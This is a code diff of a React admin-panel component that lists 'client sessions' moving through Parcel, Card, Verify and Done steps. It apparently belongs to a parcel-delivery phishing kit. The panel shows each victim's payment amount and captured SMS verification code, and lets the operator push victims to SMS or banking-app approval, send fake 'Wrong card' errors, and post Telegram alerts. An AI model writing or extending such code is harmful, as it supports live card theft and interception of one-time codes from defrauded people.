@@ -9,27 +9,15 @@ import {
   DropdownMenuSeparator,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu";
-import {
-  Tooltip,
-  TooltipContent,
-  TooltipProvider,
-  TooltipTrigger,
-} from "@/components/ui/tooltip";
 import { 
   CreditCard, 
   MessageSquare, 
   Package,
-  Clock,
   CheckCircle,
   Smartphone,
   MessageCircle,
-  Globe,
-  Copy,
-  Check,
-  MoreHorizontal,
+  MoreVertical,
   XCircle,
-  AlertTriangle,
-  Info
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -57,7 +45,7 @@ interface ClientSession {
 
 const stepNames: Record<number, string> = {
   1: "Parcel",
-  2: "Payment",
+  2: "Card",
   3: "Verify",
   4: "Done"
 };
@@ -73,48 +61,16 @@ interface ClientRowProps {
   session: ClientSession;
   isSelected?: boolean;
   onToggleSelect?: () => void;
-  onOpenDetails?: () => void;
 }
 
-export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenDetails }: ClientRowProps) {
-  const [ipCopied, setIpCopied] = useState(false);
-
-  const copyIpToClipboard = async () => {
-    if (!session.client_ip) return;
-    await navigator.clipboard.writeText(session.client_ip);
-    setIpCopied(true);
-    setTimeout(() => setIpCopied(false), 2000);
-  };
-
-  const getTimeSince = (dateString: string) => {
-    const date = new Date(dateString);
-    const now = new Date();
-    const diffMs = now.getTime() - date.getTime();
-    const diffMins = Math.floor(diffMs / 60000);
-    
-    if (diffMins < 1) return "now";
-    if (diffMins < 60) return `${diffMins}m`;
-    const diffHours = Math.floor(diffMins / 60);
-    if (diffHours < 24) return `${diffHours}h`;
-    return `${Math.floor(diffHours / 24)}d`;
-  };
-
-  const getShortIp = (ip: string | null) => {
-    if (!ip) return null;
-    const parts = ip.split('.');
-    if (parts.length === 4) {
-      return `${parts[0]}.${parts[1]}.*.*`;
-    }
-    return ip.slice(0, 10) + '...';
-  };
-
+export function ClientRow({ session, isSelected = false, onToggleSelect }: ClientRowProps) {
   // Quick actions
   const sendToSmsVerification = async () => {
     await supabase
       .from("client_sessions")
       .update({ current_step: 3, approval_type: null, verification_code: null })
       .eq("id", session.id);
-    toast({ title: "Sent to SMS" });
+    toast({ title: "→ SMS" });
   };
 
   const sendToAppApproval = async () => {
@@ -122,7 +78,7 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
       .from("client_sessions")
       .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
       .eq("id", session.id);
-    toast({ title: "Sent to App" });
+    toast({ title: "→ App" });
   };
 
   const sendWrongCardMessage = async () => {
@@ -135,7 +91,7 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
         message_type: "error"
       })
       .eq("id", session.id);
-    toast({ title: "Wrong card sent" });
+    toast({ title: "Wrong card" });
   };
 
   const sendBackToParcel = async () => {
@@ -148,7 +104,15 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
         message_type: null
       })
       .eq("id", session.id);
-    toast({ title: "Back to parcel" });
+    toast({ title: "→ Parcel" });
+  };
+
+  const sendBackToCard = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 2, approval_type: null })
+      .eq("id", session.id);
+    toast({ title: "→ Card" });
   };
 
   const confirmPayment = async () => {
@@ -157,9 +121,9 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
       .update({ current_step: 4, approval_type: "sms" })
       .eq("id", session.id);
     await supabase.functions.invoke("send-telegram", {
-      body: { message: `✅ Confirmed (SMS) - #${session.session_code}` },
+      body: { message: `✅ SMS - #${session.session_code}` },
     });
-    toast({ title: "Confirmed" });
+    toast({ title: "✓ Confirmed" });
   };
 
   const approvePayment = async () => {
@@ -168,9 +132,9 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
       .update({ current_step: 4, approval_type: "app" })
       .eq("id", session.id);
     await supabase.functions.invoke("send-telegram", {
-      body: { message: `✅ Approved (App) - #${session.session_code}` },
+      body: { message: `✅ App - #${session.session_code}` },
     });
-    toast({ title: "Approved" });
+    toast({ title: "✓ Approved" });
   };
 
   const clearMessage = async () => {
@@ -186,153 +150,112 @@ export function ClientRow({ session, isSelected = false, onToggleSelect, onOpenD
   const isAppMode = session.approval_type === "app_pending";
 
   return (
-    <div className={`flex items-center gap-2 p-2 border-b hover:bg-muted/50 transition-colors ${isSelected ? 'bg-primary/5' : ''} ${isWaiting ? 'bg-orange-500/5' : ''}`}>
+    <tr className={`border-b hover:bg-muted/50 ${isSelected ? 'bg-primary/10' : ''} ${isWaiting ? 'bg-orange-50 dark:bg-orange-950/20' : ''}`}>
       {/* Checkbox */}
-      <Checkbox
-        checked={isSelected}
-        onCheckedChange={onToggleSelect}
-        className="shrink-0"
-      />
+      <td className="p-2 w-8">
+        <Checkbox
+          checked={isSelected}
+          onCheckedChange={onToggleSelect}
+        />
+      </td>
 
-      {/* Session Code */}
-      <span className="font-mono bg-muted px-1.5 py-0.5 rounded text-xs font-bold w-16 text-center shrink-0">
-        #{session.session_code}
-      </span>
+      {/* Code */}
+      <td className="p-2">
+        <span className="font-mono text-xs font-bold">#{session.session_code}</span>
+      </td>
 
-      {/* Step Badge */}
-      <Badge className={`${stepColors[session.current_step]} text-white text-xs w-14 justify-center shrink-0`}>
-        {isWaiting ? "Wait" : stepNames[session.current_step]}
-      </Badge>
-
-      {/* Client Name */}
-      <span className="text-sm truncate w-24 shrink-0" title={session.client_name || undefined}>
-        {session.client_name || "-"}
-      </span>
+      {/* Step */}
+      <td className="p-2">
+        <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
+          {isWaiting ? "⏳" : stepNames[session.current_step]}
+        </Badge>
+      </td>
 
       {/* Amount */}
-      <span className="text-sm font-semibold text-primary w-16 shrink-0 text-right">
-        {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
-      </span>
-
-      {/* IP */}
-      {session.client_ip && (
-        <TooltipProvider>
-          <Tooltip>
-            <TooltipTrigger asChild>
-              <Badge 
-                variant="outline" 
-                className="text-xs gap-1 shrink-0 cursor-pointer hover:bg-muted w-20 justify-center"
-                onClick={copyIpToClipboard}
-              >
-                {ipCopied ? <Check className="w-3 h-3 text-green-500" /> : <Globe className="w-3 h-3" />}
-                {getShortIp(session.client_ip)}
-              </Badge>
-            </TooltipTrigger>
-            <TooltipContent>
-              <span className="font-mono text-sm">{session.client_ip}</span>
-              {ipCopied ? " ✓" : " (click to copy)"}
-            </TooltipContent>
-          </Tooltip>
-        </TooltipProvider>
-      )}
-
-      {/* Time */}
-      <span className="text-xs text-muted-foreground w-8 shrink-0 flex items-center gap-1">
-        <Clock className="w-3 h-3" />
-        {getTimeSince(session.updated_at)}
-      </span>
-
-      {/* Message indicator */}
-      {session.admin_message && (
-        <TooltipProvider>
-          <Tooltip>
-            <TooltipTrigger asChild>
-              <span className="shrink-0">
-                {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
-                {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
-                {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
-              </span>
-            </TooltipTrigger>
-            <TooltipContent>
-              <p className="max-w-[200px] text-sm">{session.admin_message}</p>
-            </TooltipContent>
-          </Tooltip>
-        </TooltipProvider>
-      )}
-
-      {/* Verification Code (if applicable) */}
-      {isVerifying && !isAppMode && session.verification_code && (
-        <span className="font-mono text-xs bg-purple-100 text-purple-700 px-1.5 py-0.5 rounded shrink-0">
-          {session.verification_code}
+      <td className="p-2 text-right">
+        <span className="font-semibold text-sm">
+          {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
         </span>
-      )}
+      </td>
 
-      {/* Spacer */}
-      <div className="flex-1" />
+      {/* Code (if verifying) */}
+      <td className="p-2">
+        {isVerifying && !isAppMode && session.verification_code && (
+          <span className="font-mono text-xs bg-purple-100 dark:bg-purple-900 text-purple-700 dark:text-purple-300 px-1.5 py-0.5 rounded">
+            {session.verification_code}
+          </span>
+        )}
+        {isVerifying && isAppMode && (
+          <span className="text-xs text-blue-600">App</span>
+        )}
+      </td>
 
-      {/* Quick Actions based on state */}
-      {isWaiting && (
-        <div className="flex items-center gap-1 shrink-0">
-          <Button size="sm" className="h-7 text-xs bg-green-600 hover:bg-green-700 px-2" onClick={sendToSmsVerification}>
-            <MessageCircle className="w-3 h-3 mr-1" /> SMS
-          </Button>
-          <Button size="sm" className="h-7 text-xs bg-blue-600 hover:bg-blue-700 px-2" onClick={sendToAppApproval}>
-            <Smartphone className="w-3 h-3 mr-1" /> App
-          </Button>
-        </div>
-      )}
-
-      {isVerifying && !isAppMode && (
-        <Button size="sm" className="h-7 text-xs bg-green-600 hover:bg-green-700 px-2 shrink-0" onClick={confirmPayment}>
-          <CheckCircle className="w-3 h-3 mr-1" /> Confirm
-        </Button>
-      )}
-
-      {isVerifying && isAppMode && (
-        <Button size="sm" className="h-7 text-xs bg-blue-600 hover:bg-blue-700 px-2 shrink-0" onClick={approvePayment}>
-          <CheckCircle className="w-3 h-3 mr-1" /> Approve
-        </Button>
-      )}
-
-      {/* More Actions Dropdown */}
-      <DropdownMenu>
-        <DropdownMenuTrigger asChild>
-          <Button variant="ghost" size="sm" className="h-7 w-7 p-0 shrink-0">
-            <MoreHorizontal className="w-4 h-4" />
-          </Button>
-        </DropdownMenuTrigger>
-        <DropdownMenuContent align="end" className="w-40">
-          <DropdownMenuItem onClick={sendBackToParcel}>
-            <Package className="w-4 h-4 mr-2" /> Back to Parcel
-          </DropdownMenuItem>
-          <DropdownMenuItem onClick={() => supabase.from("client_sessions").update({ current_step: 2, approval_type: null }).eq("id", session.id).then(() => toast({ title: "Back to Payment" }))}>
-            <CreditCard className="w-4 h-4 mr-2" /> Back to Payment
-          </DropdownMenuItem>
-          <DropdownMenuSeparator />
-          <DropdownMenuItem onClick={sendToSmsVerification}>
-            <MessageSquare className="w-4 h-4 mr-2" /> Send to SMS
-          </DropdownMenuItem>
-          <DropdownMenuItem onClick={sendToAppApproval}>
-            <Smartphone className="w-4 h-4 mr-2" /> Send to App
-          </DropdownMenuItem>
-          <DropdownMenuSeparator />
-          <DropdownMenuItem onClick={sendWrongCardMessage} className="text-orange-600">
-            <CreditCard className="w-4 h-4 mr-2" /> Wrong Card
-          </DropdownMenuItem>
-          {session.admin_message && (
-            <DropdownMenuItem onClick={clearMessage}>
-              <XCircle className="w-4 h-4 mr-2" /> Clear Message
-            </DropdownMenuItem>
+      {/* Quick Actions */}
+      <td className="p-2">
+        <div className="flex items-center gap-1">
+          {isWaiting && (
+            <>
+              <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={sendToSmsVerification}>
+                SMS
+              </Button>
+              <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={sendToAppApproval}>
+                App
+              </Button>
+            </>
           )}
-          <DropdownMenuSeparator />
-          <DropdownMenuItem onClick={confirmPayment} className="text-green-600">
-            <CheckCircle className="w-4 h-4 mr-2" /> Confirm (SMS)
-          </DropdownMenuItem>
-          <DropdownMenuItem onClick={approvePayment} className="text-blue-600">
-            <CheckCircle className="w-4 h-4 mr-2" /> Approve (App)
-          </DropdownMenuItem>
-        </DropdownMenuContent>
-      </DropdownMenu>
-    </div>
+
+          {isVerifying && !isAppMode && (
+            <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={confirmPayment}>
+              ✓ SMS
+            </Button>
+          )}
+
+          {isVerifying && isAppMode && (
+            <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={approvePayment}>
+              ✓ App
+            </Button>
+          )}
+
+          {/* More Actions */}
+          <DropdownMenu>
+            <DropdownMenuTrigger asChild>
+              <Button variant="ghost" size="sm" className="h-6 w-6 p-0">
+                <MoreVertical className="w-4 h-4" />
+              </Button>
+            </DropdownMenuTrigger>
+            <DropdownMenuContent align="end" className="w-36">
+              <DropdownMenuItem onClick={sendBackToParcel}>
+                <Package className="w-3 h-3 mr-2" /> → Parcel
+              </DropdownMenuItem>
+              <DropdownMenuItem onClick={sendBackToCard}>
+                <CreditCard className="w-3 h-3 mr-2" /> → Card
+              </DropdownMenuItem>
+              <DropdownMenuItem onClick={sendToSmsVerification}>
+                <MessageSquare className="w-3 h-3 mr-2" /> → SMS
+              </DropdownMenuItem>
+              <DropdownMenuItem onClick={sendToAppApproval}>
+                <Smartphone className="w-3 h-3 mr-2" /> → App
+              </DropdownMenuItem>
+              <DropdownMenuSeparator />
+              <DropdownMenuItem onClick={sendWrongCardMessage} className="text-orange-600">
+                <CreditCard className="w-3 h-3 mr-2" /> Wrong Card
+              </DropdownMenuItem>
+              {session.admin_message && (
+                <DropdownMenuItem onClick={clearMessage}>
+                  <XCircle className="w-3 h-3 mr-2" /> Clear Msg
+                </DropdownMenuItem>
+              )}
+              <DropdownMenuSeparator />
+              <DropdownMenuItem onClick={confirmPayment} className="text-green-600">
+                <CheckCircle className="w-3 h-3 mr-2" /> Confirm
+              </DropdownMenuItem>
+              <DropdownMenuItem onClick={approvePayment} className="text-blue-600">
+                <CheckCircle className="w-3 h-3 mr-2" /> Approve
+              </DropdownMenuItem>
+            </DropdownMenuContent>
+          </DropdownMenu>
+        </div>
+      </td>
+    </tr>
   );
 }
